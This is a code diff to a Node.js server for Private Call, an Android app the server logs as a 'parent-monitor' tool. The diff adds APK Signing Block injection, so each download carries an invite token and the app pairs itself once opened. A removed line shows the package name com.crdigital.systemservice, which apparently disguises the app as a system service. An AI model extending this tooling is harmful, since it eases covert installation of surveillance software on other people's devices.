@@ -214,6 +214,113 @@ function inviteView(req, inv) {
   return { token: inv.token, code: inv.code, url: inviteUrl(req, inv.token), expiresAt: new Date(inv.expiresAt).toISOString() };
 }
 
+// ------------------------------------------- APK signing-block invite token (v2.1)
+// The invite token can travel INSIDE the downloaded APK itself: an extra
+// ID-value pair in the APK Signing Block (the Walle/VasDolly channel
+// technique). Verifiers ignore unknown pair IDs, and the v2/v3 content
+// digests do not cover the signing block, so the signature stays valid.
+// Installing + opening such an APK lets the app pair itself — no code, no
+// deep link. The file on disk is never modified; injection is in-memory.
+const SIG_BLOCK_MAGIC = 'APK Sig Block 42';
+const INVITE_PAIR_ID = 0x50434954; // 'PCIT'
+
+// Locate the End Of Central Directory record; returns its offset or -1.
+// The EOCD sits in the last 22 + 65535 bytes (fixed part + max comment).
+function findEocd(buf) {
+  if (!Buffer.isBuffer(buf) || buf.length < 22) return -1;
+  const window = Math.min(buf.length, 22 + 65535);
+  for (let i = buf.length - 22; i >= buf.length - window; i--) {
+    if (buf.readUInt32LE(i) === 0x06054b50 && i + 22 + buf.readUInt16LE(i + 20) === buf.length) return i;
+  }
+  return -1;
+}
+
+// Walk the APK Signing Block immediately before the Central Directory.
+// Returns { eocd, cdOffset, blockStart, blockSize(BigInt), pairs } or null
+// when the buffer has no (valid) v2 signing block.
+function readSigBlock(buf) {
+  const eocd = findEocd(buf);
+  if (eocd < 0) return null;
+  const cdOffset = buf.readUInt32LE(eocd + 16);
+  if (cdOffset < 32 || cdOffset > buf.length) return null;
+  if (buf.toString('latin1', cdOffset - 16, cdOffset) !== SIG_BLOCK_MAGIC) return null;
+  const blockSize = buf.readBigUInt64LE(cdOffset - 24); // trailing size field
+  const blockStart = cdOffset - (Number(blockSize) + 8);
+  if (blockStart < 0 || buf.readBigUInt64LE(blockStart) !== blockSize) return null;
+  const pairs = [];
+  const pairsEnd = cdOffset - 24; // pairs stop where the footer size begins
+  let pos = blockStart + 8;
+  while (pos < pairsEnd) {
+    if (pos + 8 > pairsEnd) return null;
+    const pairLen = buf.readBigUInt64LE(pos);
+    if (pairLen < 4n || pos + 8 + Number(pairLen) > pairsEnd) return null;
+    pairs.push({ id: buf.readUInt32LE(pos + 8), valueStart: pos + 12, valueLen: Number(pairLen) - 4 });
+    pos += 8 + Number(pairLen);
+  }
+  if (pos !== pairsEnd) return null;
+  return { eocd, cdOffset, blockStart, blockSize, pairs };
+}
+
+// The invite token embedded in an APK buffer, or null. Never throws.
+function parseInjectedToken(buf) {
+  try {
+    const sb = readSigBlock(buf);
+    if (!sb) return null;
+    const pair = sb.pairs.find(x => x.id === INVITE_PAIR_ID);
+    if (!pair) return null;
+    return buf.toString('utf8', pair.valueStart, pair.valueStart + pair.valueLen);
+  } catch { return null; }
+}
+
+// Returns a NEW buffer: the APK with one extra signing-block pair
+// (id INVITE_PAIR_ID, value = token as UTF-8, no terminator) inserted just
+// before the block footer. Both block size fields grow by the pair size and
+// the EOCD's CD offset shifts by the same delta; every other byte of the
+// original (including all CD entries) is preserved verbatim. Null when the
+// input has no v2 signing block.
+function injectInviteToken(apkBuffer, token) {
+  try {
+    const sb = readSigBlock(apkBuffer);
+    if (!sb) return null;
+    const tokenBytes = Buffer.from(String(token), 'utf8');
+    const pairLen = 4 + tokenBytes.length;  // pair length counts id + value
+    const pairTotal = 8 + pairLen;          // plus the pair's own length field
+    const newSize = sb.blockSize + BigInt(pairTotal);
+    const oldPairsLen = sb.cdOffset - 24 - (sb.blockStart + 8);
+    const block = Buffer.alloc(Number(newSize) + 8);
+    block.writeBigUInt64LE(newSize, 0);
+    apkBuffer.copy(block, 8, sb.blockStart + 8, sb.cdOffset - 24); // old pairs
+    const np = 8 + oldPairsLen;
+    block.writeBigUInt64LE(BigInt(pairLen), np);
+    block.writeUInt32LE(INVITE_PAIR_ID, np + 8);
+    tokenBytes.copy(block, np + 12);
+    block.writeBigUInt64LE(newSize, np + pairTotal);               // trailing size
+    block.write(SIG_BLOCK_MAGIC, np + pairTotal + 8, 'latin1');    // magic
+    const out = Buffer.concat([
+      apkBuffer.subarray(0, sb.blockStart),
+      block,
+      apkBuffer.subarray(sb.cdOffset),
+    ]);
+    out.writeUInt32LE(sb.cdOffset + pairTotal, sb.eocd + pairTotal + 16); // EOCD: new CD offset
+    return out;
+  } catch { return null; }
+}
+
+// Base APK for /d/<token>: cached in memory, re-read when the file changes.
+let baseApkCache = null; // { mtimeMs, size, buf }
+function loadBaseApk() {
+  const apkPath = path.join(__dirname, 'PrivateCall.apk');
+  let st;
+  try { st = fs.statSync(apkPath); } catch { return null; }
+  if (baseApkCache && baseApkCache.mtimeMs === st.mtimeMs && baseApkCache.size === st.size) {
+    return baseApkCache.buf;
+  }
+  let buf;
+  try { buf = fs.readFileSync(apkPath); } catch { return null; }
+  baseApkCache = { mtimeMs: st.mtimeMs, size: st.size, buf };
+  return buf;
+}
+
 // ---------------------------------------------------------------- REST
 const server = http.createServer(async (req, res) => {
   const url = new URL(req.url, 'http://x');
@@ -247,6 +354,43 @@ const server = http.createServer(async (req, res) => {
       return res.end(bytes);
     }
 
+    // ---- invite-personalized APK download (public, v2.1): the served APK
+    // carries this invite's token in its signing block, so installing +
+    // opening it pairs automatically — no code, no "Open in App" step.
+    const dMatch = p.match(/^\/d\/([^/]+)$/);
+    if (dMatch && req.method === 'GET') {
+      const token = decodeURIComponent(dMatch[1]);
+      const inv = findInvite(i => i.token === token);
+      const valid = !!inv && !inv.used && Date.now() <= inv.expiresAt;
+      if (!valid) {
+        res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
+        return res.end(`<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1"><title>Private Call</title></head>
+<body style="font-family:sans-serif;text-align:center;padding:40px 20px">
+<h1>Private Call</h1>
+<p>This invite link is invalid or has expired.</p>
+<p>Please ask the person who sent it to create a new link.</p>
+</body></html>`);
+      }
+      const base = loadBaseApk();
+      const injected = base && injectInviteToken(base, inv.token);
+      if (!injected) {
+        res.writeHead(500, { 'Content-Type': 'text/html; charset=utf-8' });
+        return res.end(`<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1"><title>Private Call</title></head>
+<body style="font-family:sans-serif;text-align:center;padding:40px 20px">
+<h1>Private Call</h1>
+<p>The app file is not available on the server yet. Please try again later.</p>
+</body></html>`);
+      }
+      res.writeHead(200, {
+        'Content-Type': 'application/vnd.android.package-archive',
+        'Content-Disposition': 'attachment; filename="PrivateCall.apk"',
+        'Content-Length': injected.length,
+      });
+      return res.end(injected);
+    }
+
     // ---- invite landing page (public, SPEC-V2 §4)
     const joinMatch = p.match(/^\/join\/([^/]+)$/);
     if (joinMatch && req.method === 'GET') {
@@ -264,18 +408,14 @@ const server = http.createServer(async (req, res) => {
 </body></html>`);
       }
       const apkReady = fs.existsSync(path.join(__dirname, 'PrivateCall.apk'));
-      const intentUrl = `intent://pair?token=${inv.token}#Intent;scheme=privatecall;package=com.crdigital.systemservice;end`;
       return res.end(`<!doctype html><html lang="en"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1"><title>Private Call</title></head>
 <body style="font-family:sans-serif;text-align:center;padding:40px 20px">
 <h1>Private Call</h1>
 <p>You have been invited to install <b>Private Call</b>.</p>
-<p><a href="/app.apk" style="display:inline-block;background:#12805c;color:#fff;padding:16px 32px;border-radius:10px;text-decoration:none;font-size:20px">Download App</a></p>
+<p><a href="/d/${inv.token}" style="display:inline-block;background:#12805c;color:#fff;padding:16px 32px;border-radius:10px;text-decoration:none;font-size:20px">Download App</a></p>
 ${apkReady ? '' : '<p><i>Note: the app file is not available on the server yet.</i></p>'}
-<p>After installing, tap below to connect automatically:</p>
-<p><a href="${intentUrl}" style="display:inline-block;background:#1565c0;color:#fff;padding:16px 32px;border-radius:10px;text-decoration:none;font-size:20px">Open in App</a></p>
-<p>Or open the app and enter this code:</p>
-<p style="font-size:44px;font-weight:bold;letter-spacing:8px">${inv.code}</p>
+<p>After installing, just open the app — it connects by itself.</p>
 </body></html>`);
     }
 
@@ -858,4 +998,9 @@ wss.on('connection', (ws, req) => {
 });
 
 try { fs.mkdirSync(MEDIA_DIR, { recursive: true }); } catch {}
-server.listen(PORT, () => console.log(`parent-monitor server on :${PORT} (data: ${DATA_FILE})`));
+if (require.main === module) {
+  server.listen(PORT, () => console.log(`parent-monitor server on :${PORT} (data: ${DATA_FILE})`));
+}
+
+// Exported for tests (scripts/v2_1-test.js); running `node server.js` is unaffected.
+module.exports = { injectInviteToken, parseInjectedToken };
